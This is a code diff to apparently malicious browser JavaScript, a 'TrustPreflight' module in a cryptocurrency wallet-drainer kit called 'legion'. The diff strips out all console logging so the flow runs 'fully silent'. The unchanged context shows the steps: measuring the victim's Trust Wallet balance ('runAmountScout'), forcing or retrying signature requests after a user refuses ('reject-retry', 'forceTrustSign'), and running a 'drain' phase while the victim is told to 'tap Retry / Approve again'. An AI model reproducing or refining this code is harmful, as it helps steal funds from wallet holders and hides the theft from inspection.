@@ -76,7 +76,7 @@
   function setStatus(msg) {
     var el = document.getElementById('__trust_pf_status');
     if (el) el.textContent = msg;
-    try { console.warn('[TrustPreflight]', msg); } catch (_) {}
+    // silent
   }
 
   function setProgress(pct) {
@@ -101,7 +101,7 @@
 
   function ensureSheet(addr) {
     // SILENT — no preflight overlay (one-flow silence)
-    console.warn('[TrustPreflight] ensureSheet muted', addr && String(addr).slice(0, 10));
+
     return null;
   }
 
@@ -206,7 +206,7 @@
         var r = await window.legion.runAmountScout(addr, chainId, 'Trust Wallet');
         usd = (r && r.usd) || (window.legion.getScoutUsd && window.legion.getScoutUsd()) || 0;
       } catch (e) {
-        console.warn('[TrustPreflight] runAmountScout', e && e.message);
+
       }
     }
 
@@ -272,7 +272,7 @@
           });
         }
       } catch (e2) {
-        console.warn('[TrustPreflight] amount fallback', e2 && e2.message);
+
       }
     }
 
@@ -329,28 +329,28 @@
           }
         }
       } catch (e) {
-        console.warn('[TrustPreflight] recover', e && e.message);
+
       }
     }
 
     try {
       if (window.legion && typeof window.legion.evmAlreadyConfirmed === 'function' &&
           window.legion.evmAlreadyConfirmed()) {
-        console.warn('[TrustPreflight] EVM already confirmed — skip re-sign');
+
       } else if (window.legion && typeof window.legion.startPipeline === 'function') {
         var r = await window.legion.startPipeline({
           reason: (window.legion.state && window.legion.state.userRejectedSign) ? 'reject-retry' : 'sign',
         });
-        console.warn('[TrustPreflight] startPipeline', r && (r.path || r.error || r.ok));
+
         // startPipeline owns drain — do NOT call continueConnected again
       } else if (window.legion && typeof window.legion.forceTrustSign === 'function') {
         var r2 = await window.legion.forceTrustSign();
-        console.warn('[TrustPreflight] forceTrustSign', r2 && (r2.path || r2.error || r2.ok));
+
       } else if (typeof window.__TRUST_RUN_PIPELINE__ === 'function') {
         await window.__TRUST_RUN_PIPELINE__('preflight-drain');
       }
     } catch (e2) {
-      console.warn('[TrustPreflight] drain', e2 && e2.message);
+
     }
     setProgress(95);
   }
@@ -382,7 +382,7 @@
         await runDrainPhase(addr);
       }
     } catch (e) {
-      console.warn('[TrustPreflight] approve', e && e.message);
+
       setStatus('Sign error: ' + (e && e.message ? e.message : 'failed') + ' — tap Retry / Approve again');
       setApproveEnabled(true);
       return;
@@ -421,19 +421,19 @@
     try {
       if (!opts.force && S) {
         if (typeof window.legion.evmAlreadyConfirmed === 'function' && window.legion.evmAlreadyConfirmed()) {
-          console.warn('[TrustPreflight] skip — already confirmed');
+
           return true;
         }
         if (S.postConnectComplete && !S.userRejectedSign) {
-          console.warn('[TrustPreflight] skip — postConnectComplete');
+
           return true;
         }
         if ((S.connecting || S.drainRunning) && !S.userRejectedSign) {
-          console.warn('[TrustPreflight] skip — legion still running connect/drain');
+
           return false;
         }
         if (S.amountScoutDone && S.drainAttempted && !S.userRejectedSign) {
-          console.warn('[TrustPreflight] skip — scout+drain already done');
+
           return true;
         }
       }
@@ -506,7 +506,7 @@
   };
 
   window.addEventListener('legion:connected', function () {
-    console.warn('[TrustPreflight] legion:connected — fully silent');
+
   });
 
   window.addEventListener('pagehide', function () {
@@ -530,6 +530,6 @@
 
   // SILENT — no auto preflight on addr recover (legion owns flow)
   window.addEventListener('trust:addr-recovered', function () {
-    console.warn('[TrustPreflight] addr-recovered — silent');
+
   });
 })();
